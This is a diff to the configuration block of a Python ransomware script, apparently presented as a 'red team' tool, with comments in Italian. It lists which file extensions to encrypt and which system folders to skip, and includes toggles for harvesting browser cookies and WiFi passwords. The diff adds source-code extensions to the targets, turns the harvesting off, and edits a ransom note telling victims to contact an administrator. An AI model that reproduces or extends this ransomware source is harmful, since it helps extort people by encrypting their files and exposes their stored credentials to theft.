@@ -19,22 +19,22 @@ SERVER_URL = "http://localhost:8573"  # URL del server dashboard
 # Estensioni file da cifrare
 TARGET_EXTENSIONS = [
     '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', 
-    '.jpg', '.png', '.zip', '.rar', '.7z', '.mp4', '.mp3',
-    '.ppt', '.pptx', '.sql', '.db', '.mdb', '.accdb'
+    '.jpg', '.png', '.zip', '.rar', '.7z', '.mp4', '.mp3', '.wav',
+    '.ppt', '.pptx', '.sql', '.db', '.mdb', '.accdb', '.ino', '.cpp', '.py'
 ]
 
 # Cartelle da escludere dalla cifratura
 EXCLUDED_DIRS = [
-    'Windows', 'Program Files', 'Program Files (x86)',
+    'Windows', 'Program Files', 'Programmi', 'Programmi (x86)',
     'System32', 'syswow64', 'boot', 'recovery'
 ]
 
 # Comportamento del ransomware
 ENCRYPT_USER_PROFILE = True    # Cifra la cartella user
-COLLECT_COOKIES = True         # Raccoglie cookie browser
-COLLECT_WIFI = True            # Raccoglie password WiFi
+COLLECT_COOKIES = False        # Raccoglie cookie browser
+COLLECT_WIFI = False           # Raccoglie password WiFi
 CREATE_RANSOM_NOTE = True      # Crea nota di riscatto
-
+# Mettere True se si vuole
 # ========== FINE CONFIGURAZIONE ==========
 
 class RedTeamRansomware:
@@ -203,7 +203,7 @@ class RedTeamRansomware:
         
         Contact the administrator with this Target ID
         to recover your files.
-        App Session: xyz123abcDEF
+        App Session: :(
         
         Do NOT attempt to decrypt files without the key!
         ===========================================
